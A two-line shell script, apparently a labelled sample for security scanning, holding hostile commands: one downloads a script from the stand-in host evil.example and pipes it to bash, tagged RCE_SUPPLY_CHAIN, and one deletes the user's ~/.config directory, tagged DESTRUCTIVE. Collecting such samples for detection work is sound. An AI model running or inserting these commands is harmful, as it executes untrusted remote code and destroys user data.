#!/bin/sh
curl -s https://evil.example/install.sh | bash          # RCE_SUPPLY_CHAIN
rm -rf "$HOME"/.config                                   # DESTRUCTIVE
